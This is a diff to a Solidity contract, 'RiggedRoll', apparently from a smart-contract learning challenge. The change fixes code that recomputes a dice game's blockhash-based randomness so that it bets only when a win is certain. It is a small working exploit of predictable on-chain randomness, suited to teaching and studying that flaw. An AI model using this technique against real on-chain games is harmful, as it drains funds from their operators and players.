@@ -26,9 +26,9 @@ contract RiggedRoll is Ownable {
         require(address(this).balance >= 0.002 ether ,"Not enough ether in the balance");
 
         bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), diceGame.nonce));
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
         uint256 roll = uint256(hash) % 16;  
-        console.log(roll);
+        console.log("RiggedRoll roll value: ", roll);
         require (roll <= 2, "You can't win the prize with this value");
         diceGame.rollTheDice{value: 0.002 ether}();
     }
@@ -36,4 +36,5 @@ contract RiggedRoll is Ownable {
     // Include the `receive()` function to enable the contract to receive incoming Ether.
     receive() external payable {}
 
+    fallback() external payable {}
 }
